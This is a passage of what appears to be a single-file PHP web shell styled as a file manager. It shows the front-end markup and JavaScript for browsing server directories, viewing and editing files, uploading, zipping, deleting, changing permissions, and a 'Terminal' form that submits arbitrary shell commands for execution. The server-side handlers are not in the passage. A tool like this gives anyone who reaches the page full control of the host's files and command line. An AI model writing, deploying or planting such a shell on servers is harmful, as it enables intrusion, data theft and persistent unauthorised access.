                    $perm=substr(sprintf('%o',fileperms($u)),-4);
                    $ext=$isDir?'':strtolower(pathinfo($v,PATHINFO_EXTENSION));
                    $ec=extColor($ext);
                    $iLink=$isDir?'?d='.x($currentDirectory.'/'.$v):'?d='.x($currentDirectory).'&f='.x($v);
                    $isZip=in_array($ext,['zip','tar','gz'], true);

                    $dirIcon='<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-amber-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h5l2 2h5a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg>';
                    $fileIcon='<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 '.$ec.' flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>';

                    $btn='inline-flex items-center justify-center w-7 h-7 rounded-lg bg-slate-700/50 text-slate-400 border border-slate-700 transition-all';
                ?>
                <tr class="hover:bg-slate-800/40 transition-colors">
                    <td class="px-3 py-3 text-center"><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($v); ?>" class="item-check w-4 h-4 rounded cursor-pointer" style="accent-color:#3b82f6" onchange="updBulk()"></td>
                    <td class="px-3 py-3">
                        <div class="flex items-center gap-2">
                            <?php echo $isDir?$dirIcon:$fileIcon; ?>
                            <a href="<?php echo $iLink; ?>" class="text-slate-200 hover:text-blue-400 font-medium transition-colors truncate max-w-[180px]"><?php echo htmlspecialchars($v); ?></a>
                            <?php if($isWr)echo '<span class="w-1.5 h-1.5 rounded-full bg-blue-400/50 flex-shrink-0" title="Writable"></span>'; ?>
                        </div>
                    </td>
                    <td class="px-3 py-3 mono text-xs text-slate-500 hidden sm:table-cell"><?php echo $isDir?'<span class="text-slate-700">—</span>':formatFileSize(filesize($u)); ?></td>
                    <td class="px-3 py-3 mono text-xs text-slate-500 hidden md:table-cell"><?php echo date('Y-m-d H:i',filemtime($u)); ?></td>
                    <td class="px-3 py-3 mono text-xs hidden lg:table-cell"><span class="px-1.5 py-0.5 rounded bg-slate-800 text-slate-400"><?php echo $perm; ?></span></td>

                    <!-- View -->
                    <td class="px-2 py-3 text-center">
                        <?php if(!$isDir): ?>
                        <form method="post"><input type="hidden" name="view_file" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" title="View" class="<?php echo $btn; ?> hover:text-blue-400 hover:bg-blue-500/15 hover:border-blue-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                        </button></form>
                        <?php else: echo '<span class="text-slate-800">—</span>'; endif; ?>
                    </td>

                    <!-- Code Editor (loads file + opens editor modal) -->
                    <td class="px-2 py-3 text-center">
                        <?php if(!$isDir): ?>
                        <form method="post" onsubmit="event.preventDefault();loadAndEdit('<?php echo htmlspecialchars(addslashes($v)); ?>')">
                        <input type="hidden" name="editor_load" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" title="Edit with Code Editor" class="<?php echo $btn; ?> hover:text-violet-400 hover:bg-violet-500/15 hover:border-violet-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
                        </button></form>
                        <?php else: echo '<span class="text-slate-800">—</span>'; endif; ?>
                    </td>

                    <!-- Zip / Extract -->
                    <td class="px-2 py-3 text-center">
                        <?php if($isZip): ?>
                        <form method="post"><input type="hidden" name="extract_file" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" title="Extract zip" class="<?php echo $btn; ?> hover:text-purple-400 hover:bg-purple-500/15 hover:border-purple-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
                        </button></form>
                        <?php else: ?>
                        <form method="post"><input type="hidden" name="zip_file" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" title="Compress to zip" class="<?php echo $btn; ?> hover:text-purple-400 hover:bg-purple-500/15 hover:border-purple-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4"/></svg>
                        </button></form>
                        <?php endif; ?>
                    </td>

                    <!-- Chmod -->
                    <td class="px-2 py-3 text-center">
                        <button type="button" onclick="openChmod('<?php echo htmlspecialchars(addslashes($v)); ?>','<?php echo $perm; ?>')" title="Change permissions" class="<?php echo $btn; ?> hover:text-amber-400 hover:bg-amber-500/15 hover:border-amber-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
                        </button>
                    </td>

                    <!-- Delete -->
                    <td class="px-2 py-3 text-center">
                        <form method="post" onsubmit="return confirm('Delete <?php echo htmlspecialchars(addslashes($v)); ?>?')">
                        <input type="hidden" name="delete_file" value="<?php echo htmlspecialchars($v); ?>">
                        <button type="submit" title="Delete" class="<?php echo $btn; ?> hover:text-rose-400 hover:bg-rose-500/15 hover:border-rose-500/30">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                        </button></form>
                    </td>

                    <!-- Rename -->
                    <td class="px-2 py-3">
                        <form method="post" class="flex gap-1.5">
                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($v); ?>">
                        <input type="text" name="new_name" placeholder="New name…" required class="flex-1 min-w-0 px-2 py-1.5 text-xs mono bg-slate-800/60 border border-slate-700/50 rounded-lg text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500/50 transition-all">
                        <button type="submit" name="rename_item" value="1" title="Rename" class="flex-shrink-0 w-7 h-7 flex items-center justify-center bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-lg hover:bg-amber-500/20 transition-all">
                            <svg xmlns="http://www.w3.org/2000/svg" class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>
                        </button></form>
                    </td>
                </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php
        $cnt=count($allItems);
        echo '<div class="px-4 py-3 border-t border-slate-800/80 flex items-center justify-between text-xs text-slate-600">';
        echo '<span>'.$cnt.' item'.($cnt!==1?'s':'').'</span>';
        echo '<span class="mono truncate max-w-xs">'.htmlspecialchars($currentDirectory).'</span>';
        echo '</div>';
        ?>
    </div>
</main>

<!-- MODALS -->

<!-- New Folder -->
<div id="createFolderModal" class="fixed inset-0 z-50 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeModal('createFolderModal')"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full max-w-md shadow-2xl animate-slide-up">
        <div class="flex items-center justify-between px-6 py-4 border-b border-slate-700/50">
            <div class="flex items-center gap-3"><div class="w-8 h-8 rounded-lg bg-emerald-500/15 border border-emerald-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg></div><h2 class="font-semibold text-slate-100">New Folder</h2></div>
            <button type="button" onclick="closeModal('createFolderModal')" class="text-slate-500 hover:text-slate-300 text-xl">&times;</button>
        </div>
        <form method="post" class="p-6">
            <label class="block text-xs font-medium text-slate-400 mb-2">Folder Name</label>
            <input type="text" name="folder_name" required autofocus placeholder="my-folder" class="w-full px-3 py-2.5 mono text-sm bg-slate-800/60 border border-slate-700/50 rounded-lg text-slate-200 placeholder-slate-600 focus:outline-none focus:border-emerald-500/50 focus:bg-slate-800 transition-all mb-5">
            <div class="flex gap-3"><button type="button" onclick="closeModal('createFolderModal')" class="flex-1 px-4 py-2.5 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button><button type="submit" class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-emerald-600 rounded-xl hover:bg-emerald-500 transition-all">Create</button></div>
        </form>
    </div>
</div>

<!-- Create/Edit File (simple) -->
<div id="createEditFileModal" class="fixed inset-0 z-50 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeModal('createEditFileModal')"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full max-w-lg shadow-2xl animate-slide-up">
        <div class="flex items-center justify-between px-6 py-4 border-b border-slate-700/50">
            <div class="flex items-center gap-3"><div class="w-8 h-8 rounded-lg bg-blue-500/15 border border-blue-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg></div><h2 class="font-semibold text-slate-100">Create / Edit File</h2></div>
            <button type="button" onclick="closeModal('createEditFileModal')" class="text-slate-500 hover:text-slate-300 text-xl">&times;</button>
        </div>
        <form method="post" class="p-6">
            <label class="block text-xs font-medium text-slate-400 mb-2">File Name</label>
            <input type="text" name="file_name" required placeholder="example.php" class="w-full px-3 py-2.5 mono text-sm bg-slate-800/60 border border-slate-700/50 rounded-lg text-slate-200 placeholder-slate-600 focus:outline-none focus:border-blue-500/50 focus:bg-slate-800 transition-all mb-4">
            <label class="block text-xs font-medium text-slate-400 mb-2">Content</label>
            <textarea name="file_content" rows="8" placeholder="File content here…" class="w-full px-3 py-2.5 mono text-xs bg-slate-800/60 border border-slate-700/50 rounded-lg text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500/50 focus:bg-slate-800 transition-all resize-y mb-5"></textarea>
            <div class="flex gap-3"><button type="button" onclick="closeModal('createEditFileModal')" class="flex-1 px-4 py-2.5 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button><button type="submit" class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-blue-600 rounded-xl hover:bg-blue-500 transition-all">Save</button></div>
        </form>
    </div>
</div>

<!-- Upload -->
<div id="uploadFileModal" class="fixed inset-0 z-50 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeModal('uploadFileModal')"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full max-w-md shadow-2xl animate-slide-up">
        <div class="flex items-center justify-between px-6 py-4 border-b border-slate-700/50">
            <div class="flex items-center gap-3"><div class="w-8 h-8 rounded-lg bg-amber-500/15 border border-amber-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg></div><h2 class="font-semibold text-slate-100">Upload File</h2></div>
            <button type="button" onclick="closeModal('uploadFileModal')" class="text-slate-500 hover:text-slate-300 text-xl">&times;</button>
        </div>
        <form method="post" enctype="multipart/form-data" class="p-6">
            <label class="flex flex-col items-center justify-center gap-3 w-full h-32 border-2 border-dashed border-slate-700 rounded-xl cursor-pointer hover:border-amber-500/40 hover:bg-amber-500/5 transition-all mb-4 group">
                <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-slate-600 group-hover:text-amber-500/60 transition-colors" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"/></svg>
                <span class="text-xs text-slate-500 group-hover:text-slate-400 transition-colors">Click to browse or drag & drop</span>
                <input type="file" name="fileToUpload" required class="hidden" onchange="updUploadName(this)">
            </label>
            <p id="uploadFileName" class="text-xs mono text-slate-500 text-center mb-4 hidden"></p>
            <div class="flex gap-3"><button type="button" onclick="closeModal('uploadFileModal')" class="flex-1 px-4 py-2.5 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button><button type="submit" name="submit" class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-amber-600 rounded-xl hover:bg-amber-500 transition-all">Upload</button></div>
        </form>
    </div>
</div>

<!-- Terminal -->
<div id="runCommandModal" class="fixed inset-0 z-50 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeModal('runCommandModal')"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full max-w-lg shadow-2xl animate-slide-up">
        <div class="flex items-center justify-between px-6 py-4 border-b border-slate-700/50">
            <div class="flex items-center gap-3"><div class="w-8 h-8 rounded-lg bg-rose-500/15 border border-rose-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-rose-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></div><h2 class="font-semibold text-slate-100">Terminal</h2></div>
            <button type="button" onclick="closeModal('runCommandModal')" class="text-slate-500 hover:text-slate-300 text-xl">&times;</button>
        </div>
        <form method="post" class="p-6">
            <label class="block text-xs font-medium text-slate-400 mb-2">Command</label>
            <div class="flex items-center gap-2 px-3 py-2.5 mono bg-slate-800/60 border border-slate-700/50 rounded-lg focus-within:border-rose-500/50 focus-within:bg-slate-800 transition-all mb-5">
                <span class="text-rose-400 text-sm select-none">$</span>
                <input type="text" name="cmd_input" required autofocus placeholder="ls -la" class="flex-1 bg-transparent text-sm text-slate-200 placeholder-slate-600 focus:outline-none">
            </div>
            <div class="flex gap-3"><button type="button" onclick="closeModal('runCommandModal')" class="flex-1 px-4 py-2.5 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button><button type="submit" class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-rose-600 rounded-xl hover:bg-rose-500 transition-all">Execute</button></div>
        </form>
    </div>
</div>

<!-- Chmod -->
<div id="chmodModal" class="fixed inset-0 z-50 hidden items-center justify-center p-4">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeModal('chmodModal')"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full max-w-sm shadow-2xl animate-slide-up">
        <div class="flex items-center justify-between px-6 py-4 border-b border-slate-700/50">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-amber-500/15 border border-amber-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-amber-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg></div>
                <div><h2 class="font-semibold text-slate-100">Change Permissions</h2><p id="chmodFilename" class="text-xs mono text-slate-500 truncate max-w-[160px]"></p></div>
            </div>
            <button type="button" onclick="closeModal('chmodModal')" class="text-slate-500 hover:text-slate-300 text-xl">&times;</button>
        </div>
        <form method="post" class="p-6">
            <input type="hidden" name="chmod_file" id="chmodFileInput">
            <div class="grid grid-cols-3 gap-4 mb-5 text-xs mono">
                <?php foreach(['Owner','Group','Other'] as $gi=>$gl): ?>
                <div class="text-center">
                    <div class="text-slate-400 font-semibold mb-3 text-[11px] uppercase tracking-wider"><?php echo $gl; ?></div>
                    <div class="space-y-2">
                        <?php foreach(['Read','Write','Exec'] as $bi=>$bl): $pos=$gi*3+$bi; ?>
                        <label class="flex items-center gap-2 cursor-pointer justify-center">
                            <input type="checkbox" class="perm-bit w-3.5 h-3.5 rounded cursor-pointer" data-pos="<?php echo $pos; ?>" onchange="updOctal()" style="accent-color:#f59e0b">
                            <span class="text-slate-400 text-xs"><?php echo $bl; ?></span>
                        </label>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <div class="flex items-center gap-3 p-3 bg-slate-800/60 rounded-xl border border-slate-700/50 mb-5">
                <span class="text-xs text-slate-400 font-medium">Octal:</span>
                <input type="text" name="chmod_value" id="chmodOctal" maxlength="4" class="flex-1 bg-transparent mono text-sm text-amber-400 focus:outline-none" oninput="syncBits(this.value)">
            </div>
            <div class="flex gap-3"><button type="button" onclick="closeModal('chmodModal')" class="flex-1 px-4 py-2.5 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button><button type="submit" class="flex-1 px-4 py-2.5 text-sm font-semibold text-white bg-amber-600 rounded-xl hover:bg-amber-500 transition-all">Apply</button></div>
        </form>
    </div>
</div>

<!-- Code Editor Modal -->
<div id="editorModal" class="fixed inset-0 z-50 hidden items-center justify-center p-2 sm:p-4">
    <div class="absolute inset-0 bg-black/70 backdrop-blur-sm"></div>
    <div class="relative bg-surface-900 border border-slate-700/50 rounded-2xl w-full shadow-2xl animate-slide-up flex flex-col" style="max-width:900px;max-height:95vh">
        <!-- Header -->
        <div class="flex items-center justify-between px-5 py-3 border-b border-slate-700/50 flex-shrink-0">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded-lg bg-violet-500/15 border border-violet-500/25 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-violet-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg></div>
                <span class="font-semibold text-slate-100 text-sm">Code Editor</span>
                <span id="edFname" class="text-xs mono text-slate-500 truncate max-w-[200px]"></span>
            </div>
            <div class="flex items-center gap-2">
                <select id="edLang" onchange="hlPreview()" class="text-xs mono bg-slate-800 border border-slate-700 text-slate-300 rounded-lg px-2 py-1 focus:outline-none focus:border-violet-500/50">
                    <option value="">Auto</option>
                    <option value="php">PHP</option><option value="javascript">JS</option><option value="typescript">TS</option>
                    <option value="html">HTML</option><option value="css">CSS</option><option value="python">Python</option>
                    <option value="bash">Bash</option><option value="sql">SQL</option><option value="json">JSON</option>
                    <option value="xml">XML</option><option value="markdown">Markdown</option><option value="plaintext">Plain</option>
                </select>
                <button type="button" onclick="closeModal('editorModal')" class="text-slate-500 hover:text-slate-300 text-xl leading-none">&times;</button>
            </div>
        </div>
        <!-- Tabs -->
        <div class="flex border-b border-slate-700/50 flex-shrink-0 bg-slate-800/30">
            <button type="button" id="tabEdit" onclick="switchEdTab('edit')" class="px-4 py-2.5 text-xs font-medium text-blue-400 border-b-2 border-blue-500 transition-all">✏️ Edit</button>
            <button type="button" id="tabPrev" onclick="switchEdTab('prev')" class="px-4 py-2.5 text-xs font-medium text-slate-500 border-b-2 border-transparent hover:text-slate-300 transition-all">🎨 Preview</button>
        </div>
        <!-- Edit panel -->
        <div id="edPanelEdit" class="flex-1 flex flex-col overflow-hidden">
            <textarea id="edTA" spellcheck="false" onkeydown="tabKey(event)" oninput="updLines()"
                class="flex-1 w-full mono text-xs text-slate-300 bg-[#1a2332] p-4 focus:outline-none resize-none"
                style="min-height:380px;tab-size:4;line-height:1.6;"></textarea>
        </div>
        <!-- Preview panel -->
        <div id="edPanelPrev" class="hidden flex-1 overflow-auto bg-[#282c34]">
            <pre class="m-0 rounded-none"><code id="edPreviewCode" class="text-xs" style="font-family:'JetBrains Mono',monospace;"></code></pre>
        </div>
        <!-- Footer -->
        <div class="flex items-center justify-between px-5 py-3 border-t border-slate-700/50 flex-shrink-0 bg-slate-800/30">
            <div class="flex items-center gap-4 text-xs mono text-slate-600">
                <span id="edLines">0 lines</span>
                <span id="edChars">0 chars</span>
            </div>
            <div class="flex gap-3">
                <button type="button" onclick="closeModal('editorModal')" class="px-4 py-2 text-sm font-medium text-slate-400 bg-slate-800/60 rounded-xl hover:bg-slate-700/60 transition-all">Cancel</button>
                <button type="button" onclick="saveEditor()" class="px-5 py-2 text-sm font-semibold text-white bg-violet-600 rounded-xl hover:bg-violet-500 transition-all flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-3m-1 4l-3 3m0 0l-3-3m3 3V4"/></svg>
                    Save File
                </button>
            </div>
        </div>
        <!-- Hidden save form -->
        <form method="post" id="edSaveForm" class="hidden">
            <input type="hidden" name="file_name" id="edSaveName">
            <input type="hidden" name="file_content" id="edSaveContent">
        </form>
    </div>
</div>

<!-- SCRIPTS -->
<script>
// ── Modals ──
function openModal(id){const m=document.getElementById(id);m.classList.remove('hidden');m.classList.add('flex');document.body.classList.add('modal-open');}
function closeModal(id){const m=document.getElementById(id);m.classList.add('hidden');m.classList.remove('flex');document.body.classList.remove('modal-open');}
function toggleMobileMenu(){document.getElementById('mobileMenu').classList.toggle('hidden');}
function closeMobileMenu(){document.getElementById('mobileMenu').classList.add('hidden');}
function updUploadName(i){const l=document.getElementById('uploadFileName');if(i.files&&i.files[0]){l.textContent=i.files[0].name;l.classList.remove('hidden');}}

// ── Auto-dismiss status ──
document.addEventListener('DOMContentLoaded',()=>{
    const s=document.getElementById('statusMsg');
    if(s){setTimeout(()=>{s.style.opacity='0';s.style.transition='opacity 0.5s';},3500);setTimeout(()=>s.remove(),4100);}
    hljs.highlightAll();
    // Auto-open editor if PHP pre-loaded content
    if(window._editorAutoLoad){
        openEditorWith(window._editorAutoLoad.filename,window._editorAutoLoad.content);
    }
});

// ── Bulk select ──
function toggleAll(cb){document.querySelectorAll('.item-check').forEach(c=>c.checked=cb.checked);updBulk();}
function updBulk(){
    const ch=document.querySelectorAll('.item-check:checked');
    const bar=document.getElementById('bulkBar');
    document.getElementById('selectedCount').textContent=ch.length;
    if(ch.length>0){bar.classList.remove('hidden');bar.classList.add('flex');}
    else{bar.classList.add('hidden');bar.classList.remove('flex');}
    document.getElementById('checkAll').checked=ch.length>0&&ch.length===document.querySelectorAll('.item-check').length;
}
function clearSel(){document.querySelectorAll('.item-check').forEach(c=>c.checked=false);document.getElementById('checkAll').checked=false;updBulk();}
function submitBulkDelete(){
    const checked=document.querySelectorAll('.item-check:checked');
    if(!checked.length)return;
    if(!confirm('Delete '+checked.length+' selected item(s) permanently?'))return;
    const container=document.getElementById('bulkItemsContainer');
    container.innerHTML='';
    checked.forEach(cb=>{
        const inp=document.createElement('input');
        inp.type='hidden';inp.name='selected_items[]';inp.value=cb.value;
        container.appendChild(inp);
    });
    document.getElementById('bulkForm').submit();
}

// ── Chmod ──
function openChmod(f,p){
    document.getElementById('chmodFilename').textContent=f;
    document.getElementById('chmodFileInput').value=f;
    const oct=p.length===4?p.slice(1):p;
    document.getElementById('chmodOctal').value=oct;
    syncBits(oct);
    openModal('chmodModal');
}
function syncBits(v){
    if(v.length<3)return;
    const s=v.length===4?v.slice(1):v;
    const bits=[];
    for(const d of s)for(let b=2;b>=0;b--)bits.push(!!(parseInt(d)&(1<<b)));
    document.querySelectorAll('.perm-bit').forEach((cb,i)=>{cb.checked=bits[i]||false;});
}
function updOctal(){
    const bits=[...document.querySelectorAll('.perm-bit')].map(c=>c.checked?1:0);
    let o='';
    for(let i=0;i<9;i+=3)o+=String((bits[i]<<2)|(bits[i+1]<<1)|bits[i+2]);
    document.getElementById('chmodOctal').value=o;
}

// ── Code Editor ──
let edCurrentFile='';
const extLangMap={php:'php',js:'javascript',ts:'typescript',html:'html',htm:'html',css:'css',json:'json',xml:'xml',sql:'sql',py:'python',sh:'bash',bash:'bash',md:'markdown'};

function loadAndEdit(filename){
    // Submit via fetch to get file content, then open editor
    const fd=new FormData();fd.append('editor_load',filename);
    fetch(window.location.href,{method:'POST',body:fd})
        .then(r=>r.text()).then(html=>{
            const doc=new DOMParser().parseFromString(html,'text/html');
            const sc=doc.querySelector('script[data-editor]');
            // Parse window._editorAutoLoad from returned page
            const match=html.match(/window\._editorAutoLoad=(\{.*?\});/s);
            if(match){
                try{
                    const data=JSON.parse(match[1]);
                    openEditorWith(data.filename,data.content);
                }catch(e){openEditorWith(filename,'// Could not load file content');}
            }else{openEditorWith(filename,'// Could not load file content');}
        }).catch(()=>openEditorWith(filename,'// Network error'));
}

function openEditorFromResultBox(){
    const btn=document.querySelector('#resultBox button[data-filename]');
    if(!btn)return;
    const filename=btn.getAttribute('data-filename');
    const rawTA=document.getElementById('resultRawContent');
    const content=rawTA?rawTA.value:'';
    openEditorWith(filename,content);
}
function openEditorWith(filename,content){
    edCurrentFile=filename;
    document.getElementById('edFname').textContent=filename;
    document.getElementById('edSaveName').value=filename;
    document.getElementById('edTA').value=content;
    updLines();
    // Set language
    const ext=filename.split('.').pop().toLowerCase();
    const lang=extLangMap[ext]||'';
    document.getElementById('edLang').value=lang;
    switchEdTab('edit');
    openModal('editorModal');
}
function openEditorFromView(filename,content){openEditorWith(filename,content);}

function switchEdTab(tab){
    const isEdit=tab==='edit';
    document.getElementById('edPanelEdit').classList.toggle('hidden',!isEdit);
    document.getElementById('edPanelPrev').classList.toggle('hidden',isEdit);
    document.getElementById('tabEdit').className='px-4 py-2.5 text-xs font-medium transition-all border-b-2 '+(isEdit?'text-blue-400 border-blue-500':'text-slate-500 border-transparent hover:text-slate-300');
    document.getElementById('tabPrev').className='px-4 py-2.5 text-xs font-medium transition-all border-b-2 '+(!isEdit?'text-blue-400 border-blue-500':'text-slate-500 border-transparent hover:text-slate-300');
    if(!isEdit)hlPreview();
}
function hlPreview(){
    const code=document.getElementById('edPreviewCode');
    const lang=document.getElementById('edLang').value;
    code.textContent=document.getElementById('edTA').value;
    code.className=lang?'language-'+lang:'';
    if(lang){hljs.highlightElement(code);}else{hljs.highlightAuto(code.textContent).then?(()=>{}):(code.innerHTML=hljs.highlightAuto(code.textContent).value);}
    try{if(!lang)code.innerHTML=hljs.highlightAuto(document.getElementById('edTA').value).value;}catch(e){}
}
function updLines(){
    const t=document.getElementById('edTA').value;
    document.getElementById('edLines').textContent=t.split('\n').length+' lines';
    document.getElementById('edChars').textContent=t.length+' chars';
}
function tabKey(e){
    if(e.key==='Tab'){e.preventDefault();const t=e.target,s=t.selectionStart,en=t.selectionEnd;t.value=t.value.substring(0,s)+'    '+t.value.substring(en);t.selectionStart=t.selectionEnd=s+4;updLines();}
}
function saveEditor(){
    document.getElementById('edSaveName').value=edCurrentFile;
    document.getElementById('edSaveContent').value=document.getElementById('edTA').value;
    document.getElementById('edSaveForm').submit();
}
</script>
</body>
</html>